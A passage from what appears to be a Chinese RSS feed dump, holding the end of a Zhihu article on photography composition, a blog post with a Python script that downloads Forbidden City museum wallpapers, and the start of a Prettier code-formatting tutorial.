src=\"https://pic3.zhimg.com/v2-4ee3a15304c26f20b9b8515fd533e6c6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic3.zhimg.com/v2-4ee3a15304c26f20b9b8515fd533e6c6_r.jpg\"></figure><p>而确定了拍什么以后，我们就要清楚「怎么拍」。第二句话已经给出了非常明显的答案：</p>\n<p><b>「引导注意力」。</b></p>\n<p>而这 5 个字，就是构图的意义，或者是说就是构图的根本目的。我们可以随便列举一种构图方式，比如我们刚刚所说的三分法。为什么我们要把人物放置在画面中的三分之一处，这是因为有数据显示，当我们观看照片时，我们的视觉第一落点往往是三分之一附近。</p>\n<p>也就是说，三分法的最终目的是寻找你注意力的第一落点。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-31cc84a354922eee9217109d3e34b5eb_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-31cc84a354922eee9217109d3e34b5eb_r.jpg\"></figure><p>而第三句话，一幅好照片必须简洁，本质要做的也是「不要分散注意力」。</p>\n<p>到这里，我们发现一张好照片的三要素中，有两个都是主要由构图来完成。这也在某种意义上，证明的构图的重要性。而归根到底，所谓的构图，就是让照片的阅读者看到你想要传达的「主题」。</p>\n<p>所以你现在应该知道「我这个构图对不对」错在哪里了，因为对于任何一张照片，只要是能够做到上述两条的选择都是合适的构图。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-769f68e3a6f95f13b25027e944960f18_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic1.zhimg.com/v2-769f68e3a6f95f13b25027e944960f18_r.jpg\"></figure><p>「引导注意力」说起来简单，但是想要实践起来却是难度极高。而构图这件事几乎是所有摄影在使用整个摄影生涯为之实践和不断探索。甚至是，它奠定了很多著名摄影师的风格。不过别担心，好在构图上手也非常简单，只要你能读到这里，并且循序渐进地实践，有明显进步并不难。</p>\n<p>不过在具体开始构图法则开始之前，我依然想要特别强调，不要死记硬背，要尝试从底层的逻辑去了解。</p>\n<h3>基础构图</h3>\n<p>所谓的基础构图本质，就是画面中元素的摆放。想象一下，我们的照片无非就是一个二维形状的空间筛选。比如下面这张图中，白色的范围就是画面的取景范围。而基础构图就是把画面中的元素安排在这个区域内。比如我们现在有一个人物，就叫他张三吧，它的大致形状可以抽象为一个圆形和连接一个长方形。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-aacf47fd3a3001fcca7983142b502001_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2732\" data-rawheight=\"2048\" class=\"origin_image zh-lightbox-thumb\" width=\"2732\" data-original=\"https://pic2.zhimg.com/v2-aacf47fd3a3001fcca7983142b502001_r.jpg\"></figure><p>那么我们拍摄张三时，构图就是安排他在画面中的内容。比如我们可以只让张三露出一个头：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-90766c3b13e47840d7b9dbde59bc84bf_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2732\" data-rawheight=\"2048\" class=\"origin_image zh-lightbox-thumb\" width=\"2732\" data-original=\"https://pic4.zhimg.com/v2-90766c3b13e47840d7b9dbde59bc84bf_r.jpg\"></figure><p>一般来说，显然如果这是张三男朋友拍摄的照片，张三的男朋友肯定已经被「狂徒」制裁了。</p>\n<p>所以其实不真正拍照你也可以练习构图，因为你现在就可以直接给张三想出很多构图，比如：</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-ca48a1d1a337354e623ad107df255939_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2732\" data-rawheight=\"2048\" class=\"origin_image zh-lightbox-thumb\" width=\"2732\" data-original=\"https://pic2.zhimg.com/v2-ca48a1d1a337354e623ad107df255939_r.jpg\"></figure><p>而这种构图方式，就是要学的基础构图，归根到底，就是主体的摆放。而以下提到的方式，无非就是摆放的规则。</p>\n<p><b>三分法</b></p>\n<p>这绝对是最为流行的构图方式，流行到，今天几乎甚至是在一些景区里大多数游客都已经知道：</p>\n<p>「拍照不要站中间，要往一侧站一点。」</p>\n<p>这种构图方式其实已经越来越被熟知。在前面的设置环节中，我提到了一定要打开网格线，因为网格线本身就是帮你划好的三分线。而在这个划好的三分线上，我们可以看到画面中一共「四根线」和「四个点」。</p>\n<p>所以，只要把画面按照这样的风格方式摆布，就是最直接的构图。</p>\n<p>比如我们直接把张三放到右侧的线一侧，同时把张三的眼睛放在右上侧的交点上，这样就完成了一个最为简单直接的构图方式。这样的构图方式在人像摄影中比比皆是，比如下图：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-573df5599aa3829b601cb01ede455bd3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-573df5599aa3829b601cb01ede455bd3_r.jpg\"></figure><p>其实三分法并不难，难在如何快速找到三条线和焦点。比如风景摄影师中，最重要的一个选择就是天际线的摆布位置。而如果你打开了参考线，这就不是一个难题。这就是我为什么一再强调打开参考线，它真的很重要。</p>\n<p><b>黄金螺线</b></p>\n<p>黄金螺线法则其实来自于绘画，相信这条螺旋线你可能已经或多或少的看过。人们认为在这个螺旋风分割线上的人或者物，更能被视觉看到，或者说看起来更美。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-f3f6efc8f0326913500d4a7c3250721d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2778\" data-rawheight=\"1562\" class=\"origin_image zh-lightbox-thumb\" width=\"2778\" data-original=\"https://pic2.zhimg.com/v2-f3f6efc8f0326913500d4a7c3250721d_r.jpg\"></figure><p>不过需要说明的是，黄金螺旋线并不是所有的构图比例都适用。归根到底，它是在构图比例为 16:9 的画幅中才是最正确的计算结果。所以想要使用黄金螺旋线构图，最好先选择画面的内容是 16:9。不过日常生活中，很难严谨，其实大致归结为三分法也基本不差。</p>\n<p><b>居中构图</b></p>\n<p>三分法的熟知，可能让我们反而忽视了居中构图。</p>\n<p>比如我们再次请出张三，我们可以看到如果我们把它放到画面中央，虽然整个画面很呆板，并不灵活。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-46c83803e61034296712990cdf5e4847_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2732\" data-rawheight=\"2048\" class=\"origin_image zh-lightbox-thumb\" width=\"2732\" data-original=\"https://pic4.zhimg.com/v2-46c83803e61034296712990cdf5e4847_r.jpg\"></figure><p>但是它有一个非常重要的特征：</p>\n<p>端庄，正式。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-479d0ceb150c570b2768e3f45909fadc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic1.zhimg.com/v2-479d0ceb150c570b2768e3f45909fadc_r.jpg\"></figure><p>而这也是居中构图的最大好处。</p>\n<p>因此在一些非常严肃的人像摄影中，居中法几乎就是最好的选择。所以这也恰恰说明了一个道理，任何一个构图方式之间并没有本质的优劣或者是高级。而是需要拍摄者，需要根据题材进行一个非常主动的选择。所以并不是居中构图不好，只是它需要合适的场景。</p>\n<p><b>对称构图</b></p>\n<p>对称构图基本上最常见的有两种构图分支，一个是：</p>\n<p><b>1. 镜面构图</b></p>\n<p>利用生活中，一切可以出现的镜面，并利用场景的反射往往可以拍摄非常多有趣的画面。而且其实除了常规的镜子以外，有很多生活中随处可得的简单物品都可以是合适的镜面，比如我们的手机屏幕就是。把一台手机的屏幕放置在手机镜头的底部附近，你就会发现一个纯天然的镜面。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-1b68b2d2f62ba415295c1f34299e8dee_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic3.zhimg.com/v2-1b68b2d2f62ba415295c1f34299e8dee_r.jpg\"></figure><p>水面也是一个非常常见的镜面构图的辅助。尤其是一些湖泊，海洋等等。只要我们在一个相对来说比较合适的光线场景，我们都可以让天空中的景色映入水幕。而且其实这里有一个很重要的技巧，一些场景中，如果本身没有水面我们也可以制造水面，比如在夜晚拍摄时，如果是晴天无水的街面，可能只要稍稍一点的水倒在地面上，就可以拍摄出很不错的镜面灯光反射。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-43399f29d3067443762c964198f0213f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-43399f29d3067443762c964198f0213f_r.jpg\"></figure><p>这其中一个最为重要的技巧就是手机镜头一定要低，尽可能的接近地面。</p>\n<p>而这也解释了为什么雨天拍照反而效果更好，因为下雨以后地面上会有很多水面，这些水面镜像出来的光线会让画面更加丰富有趣。</p>\n<p><b> 2. 元素构图</b></p>\n<p>元素对称并没有镜面对称这么直接，因为镜面对称是光线的基本原理，是肉眼可见的。而接下来的元素对称则需要一点想象力。比如我们再次请回我们的张三同学，在下面的画面中，我们可以看到张三同学站在画面的一侧，而另一侧又站了另一个李四同学。</p>\n<p>那么我们现在可以在张三李四之间划一条线，我们发现张三李四恰好处在对称的点上，这就是我们所说的元素对称。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-23ad0b05fcb8b8e531bd439e04dbfacb_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2732\" data-rawheight=\"2048\" class=\"origin_image zh-lightbox-thumb\" width=\"2732\" data-original=\"https://pic4.zhimg.com/v2-23ad0b05fcb8b8e531bd439e04dbfacb_r.jpg\"></figure><p>如果要说元素对称最了不起的还是要属我最喜欢的导演之一，韦斯安德森。单单说他的名字很多人可能不熟悉，但是你一定要听说过《布达佩斯大饭店》。</p>\n<p>在这部电影里，我们随处可见类似的元素对称，比如下面的截图：</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-318238ce3aec0e276652c20a46d64521_b.jpg\" data-size=\"normal\" data-rawwidth=\"5760\" data-rawheight=\"3840\" class=\"origin_image zh-lightbox-thumb\" width=\"5760\" data-original=\"https://pic2.zhimg.com/v2-318238ce3aec0e276652c20a46d64521_r.jpg\"><figcaption>《布达佩斯大饭店》剧照</figcaption></figure><p>这样的构图方式，会让整个画面具有设计感和视觉美感。而韦斯安德森对于这种构图方式的执念，也让他拥有了属于自己的风格。</p>\n<p>而这里也给我们两个很重要的启示：</p>\n<ol>\n<li>构图方式很多，如果不知道怎么构图选择，不如先挑选一个自己喜欢的构图方式，不断尝试，届时自然相通。</li>\n<li>多看好电影其实是一种非常有效和高效的构图方式。电影中的用光和构图都经过非常细致的考量，而且相比照片不同，很多电影还要考虑动态的光影和构图，更是难上加难。所以看电影的时候，稍微观察一下，很快就能感受到进步。</li>\n</ol>\n<p><b>引导线构图</b></p>\n<p>当然对于一张摄影作品来说，很多时候画面中不仅仅有这形状，还是线。最为常见的线自然是河流或者是山川的流动。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-a97ffa5d4dac6d4f41c78f14c834ba94_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic1.zhimg.com/v2-a97ffa5d4dac6d4f41c78f14c834ba94_r.jpg\"></figure><p>而画面中只要是出现流动的线，就会对照片读者的视线有着非常直接的引导作用。所以这也引申出风光摄影另一个非常经典的公式，我管它叫做「山下的河流」。</p>\n<p>比如最经典的亚当斯的这一张照片：</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-ca6e8933cccaa393a532d447e5113dec_b.jpg\" data-size=\"normal\" data-rawwidth=\"2036\" data-rawheight=\"1652\" class=\"origin_image zh-lightbox-thumb\" width=\"2036\" data-original=\"https://pic1.zhimg.com/v2-ca6e8933cccaa393a532d447e5113dec_r.jpg\"><figcaption>The Tetons and the Snake River, Grand Teton National Park（安塞尔·亚当斯作品）</figcaption></figure><p>在这张中，我们的视线一开始一定会聚焦在这条河流上，然后我们会随着河流的移动方向，就可以看到远处的山脉，而其实对于这张作品而言，最终的主角正是远处的山脉。</p>\n<p>而使用线条引导画面历史上还有更为经典的一张作品，如图：</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-7b19b29125bff13e1e107b8a6f6b3ff4_b.jpg\" data-size=\"normal\" data-rawwidth=\"2034\" data-rawheight=\"1366\" class=\"origin_image zh-lightbox-thumb\" width=\"2034\" data-original=\"https://pic1.zhimg.com/v2-7b19b29125bff13e1e107b8a6f6b3ff4_r.jpg\"><figcaption>亨利·卡蒂埃-布列松作品</figcaption></figure><p>上图中，正是因为楼梯的引导线存在，给观众一个非常重要的错觉，会让我们觉得似乎骑自行车的人实际上是从楼梯上下来的。但无论是从哪里下来的，引导线的存在立刻就会让我们的视觉焦点停留在骑自行车的人上。所以下次，当你的画面中，出现线的时候，一定要好好加以利用，想一想，你可以让它的视线引导到哪里。</p>\n<h3>进阶构图</h3>\n<p>在进阶构图开始之前，我还是需要进行再一次的强调，「引导注意力」。因为接下来我要说的构图，无论多么抽象，多么难以理解，归根到底你要知道它的目的就是一种「注意力管理」。</p>\n<p><b>利用前景</b></p>\n<p>其实在摄影眼的部分，在超广角的部分我们已经描述过前景的作品，但是当时仅仅是局限在风光摄影。但是实际上，在各类题材中，前景都是非常好的拍摄手法。</p>\n<p>前景最为直接的作用就是简化画面，因为它的遮挡可以让画面中一些分散注意力的部分直接去除。但更重要的是，前景的构图，可以让照片从「二维」跳脱为「三维」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-ca37151fabbac79b014cba1753b959ad_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2995\" data-rawheight=\"3993\" class=\"origin_image zh-lightbox-thumb\" width=\"2995\" data-original=\"https://pic2.zhimg.com/v2-ca37151fabbac79b014cba1753b959ad_r.jpg\"></figure><p>因为大多数照片都是主体和背景构成，画面中只有两层。但是由于前景的出现，画面直接变为了「前、中、后」三层，具有更强的立体感。</p>\n<p><b>寻找画框</b></p>\n<p>不过要说到吸引注意力，那么我想没有任何一种构图方式比框式构图更为直接。道理也很简单，如果给你一页文字，让你在这个文字中标出重点，那么最直接有效的办法是什么呢？</p>\n<p>画个圈。</p>\n<p>是的，所谓的画框构图就有这样类似的作用，比如下面这张图，由于窗框的存在，我们可以直接可以聚焦在模特身上，而显然这就是画面的主体。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-2f6cddf6111b69cdaf7404c50d685722_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3133\" data-rawheight=\"2350\" class=\"origin_image zh-lightbox-thumb\" width=\"3133\" data-original=\"https://pic3.zhimg.com/v2-2f6cddf6111b69cdaf7404c50d685722_r.jpg\"></figure><p>更为高级的是，这种框选不仅仅是吸引注意力，它同时还能够让画面中立刻有了「画里画外」两个世界，尤其是一些在交通工具内拍摄的场景更是如此。它不仅仅在客观上明确的告诉你照片内的空间关系，同时很多时候也可以成为一种内在隐含，让人对拍摄者和窗外世界的联系有诸多遐想。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-271bd991508135e6875e4fa381dd2c51_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic2.zhimg.com/v2-271bd991508135e6875e4fa381dd2c51_r.jpg\"></figure><p>因此，多多观察生活中这些「已经画好的圈」。</p>\n<p><b>控制明暗</b></p>\n<p>严格意义上，明暗某种意义上来说应该算作是一种曝光的手法。但是这些年来，明暗的反差手法也的确成为了一种流行趋势。而自从彩色摄影出现以来，也的确有不少的大师以这种手法见长。</p>\n<p>在这里，所谓的明暗含义是通过画面中过度曝光，或者是过度欠曝，让画面中出现大面积的白色或者是黑色，或者是黑白两色为主。此时一般出现在画面中的人物很容易成为没有信息的剪影。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-fb744f3cdf9c8e3516283836e1f08844_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3060\" data-rawheight=\"4080\" class=\"origin_image zh-lightbox-thumb\" width=\"3060\" data-original=\"https://pic1.zhimg.com/v2-fb744f3cdf9c8e3516283836e1f08844_r.jpg\"></figure><p>但这也是我认为明暗控制方式应该算作构图的原因，因为这种方式大大去掉了画面中的干扰信息，让画面十分简洁。</p>\n<p><b>传达质感</b></p>\n<p>这可能是最为抽象的构图方式，但是其实果你还对汉语中「移觉和通感」这种修辞手法有记忆，那么其实二者是完全相同的。</p>\n<p>在汉语中，所谓的移觉或通感是说：</p>\n<p>用形象的语言把人们某个感官上的感觉移植到另一个感官上，凭借感觉相通，相互映照，以收到启发读者联想、体味余韵和深化诗文意境的效果。</p>\n<p>而在摄影中，我们如何通过视觉的方式，让读者其它的感光也有所感触，就是「质感构图」的作用。</p>\n<p>比如下图：</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-6e94ade9f8541dad2dee07b1e5185aec_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3859\" data-rawheight=\"2894\" class=\"origin_image zh-lightbox-thumb\" width=\"3859\" data-original=\"https://pic1.zhimg.com/v2-6e94ade9f8541dad2dee07b1e5185aec_r.jpg\"></figure><p>这是一张我们在魔鬼城里拍摄的沙地，这张图中，拍摄时摄影师一个很重要的想法就是通过寻找角度让沙子的颗粒更加明显，而这样做的目的就是当读者看到画面时，立刻能够想到自己的手对于沙子的触感。</p>\n<p>也就是说，拍照虽然是视觉艺术，但是我们是可以通过巧妙的方式，让我们的其它感官获得反馈。一个最简单直接的例子就是美食摄影中，很多飘散的烟雾就是「嗅觉的可视化」。</p>\n<p>而这就是所谓的质感构图。</p>\n<p>读到这里，相信你对构图已经有了一个重新的认识。我最后唯一还能再分享的就是我自己的构图学习历程。从我的经验来看，构图会有一个：</p>\n<p>「从无到有，然后从有到无的过程」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-987ec9aacb297c613b9bbeb615e3031a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic3.zhimg.com/v2-987ec9aacb297c613b9bbeb615e3031a_r.jpg\"></figure><p>所谓从无到有，就是正在阅读本文的各位，现在你已经了解到了很多构图方式，心里已经有了构图这件事。我相信聪明的你，现在拿起手机想要拍照，第一件事就是下意识构图。</p>\n<p>但是随着时间的推移，你会发现你很少再会注意构图这件事，但是你的作品却在潜移默化中悄悄的完成构图。这就是从有到无。</p>\n<p>但这还不是结束，而我也正在处于这一阶段，这就是「演绎自己的构图」。比如韦斯·安德森的对称构图，Alex Webb 的复杂构图等等等。</p>\n<p>所以，不仅是你，包括我自己到今天都是构图学习的学生，我们一起要走的路还有很远，毕竟学习怎么会有尽头。</p>\n<h2>写在最后</h2>\n<p>我不知道，会有多少人可以读到这里。</p>\n<p>毕竟这是一篇最终定格在 30000 字的文章，匀速阅读到这里至少需要接近 100 分钟。100 分钟看似不长，仅仅是一部电影的跨度。但是人生苦短，你能拿出生命中的 100 分钟和我一起在摄影的旅程中一起冒险，我深感荣幸。</p>\n<p>所以如果你真的读到这里，我很希望你可以大方地在评论区说说你的感受，让我知道过去我两个月的努力和付出真的对你有帮助，这对我很重要，是我创作的最大动力。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-137fc324ce959645512261beb33f5c70_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3204\" data-rawheight=\"2403\" class=\"origin_image zh-lightbox-thumb\" width=\"3204\" data-original=\"https://pic1.zhimg.com/v2-137fc324ce959645512261beb33f5c70_r.jpg\"></figure><p>按照惯例我需要在这里感谢本篇文章付出的每一个工作人员，他们是：</p>\n<ul>\n<li>本文中大量插图的拍摄者，厉害的手机摄影师也是我的挚友 Jamie-hua</li>\n<li>本文的编辑 nerd_du</li>\n<li>我们团队的支撑力量，批预算的制片人 Irene</li>\n</ul>\n<p>当然，还有本文的每一位读者。</p>\n<p>不过我想作为一篇分享，最好的致谢是「倾其所有」。思来想去，在技术上这篇文章已经倾囊相授，我还能说给你听的，只有我在摄影学习中的教训和经验，我就用它来做为本文的结尾吧。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-eaf1e491a893de6a6e732ebc8785f930_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2044\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic1.zhimg.com/v2-eaf1e491a893de6a6e732ebc8785f930_r.jpg\"></figure><ol>\n<li>\n<b>没有终点。</b>当你走上摄影这条路，就意味着终生学习，不仅仅是随着时代进步的技术，还有人生的经历。最后决定你照片厚度的，不是照片的数量，而是人生的阅历。</li>\n<li>\n<b>保持谦逊。</b>无论何时都不要说「已经拍得够好了」，多去看看别人在做什么，拍什么。我深知自身能力有限，所以今日所叙，应该是你摄影的起点，而不是重点。</li>\n<li>\n<b>学会享受。</b>纠结自己拍得好不好，作为鞭策自己的动力就好。重要的是，要学会找到摄影的乐趣，希望你有一天能做到对着自己拍摄的照片说出：<b>「今天拍了这么多了，已经很好了，我很满足。」</b>\n</li>\n</ol>\n<p>好了，列车终究要到站，期待在摄影学习的路上，与各位再会。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/bigface-62?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Derrick Zhang</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/391495508?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" 